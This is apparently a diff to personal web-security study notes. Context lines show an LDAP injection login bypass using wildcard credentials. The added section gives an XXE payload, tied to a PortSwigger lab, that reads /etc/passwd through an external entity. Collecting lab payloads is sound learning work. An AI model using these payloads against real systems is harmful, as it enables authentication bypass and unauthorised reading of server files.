@@ -21,3 +21,9 @@ Login Bypass -
 user=*
 password=*
 --> (&(user=*)(password=*))
+
+# XML Injection
+Lab : https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
+Payload : <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
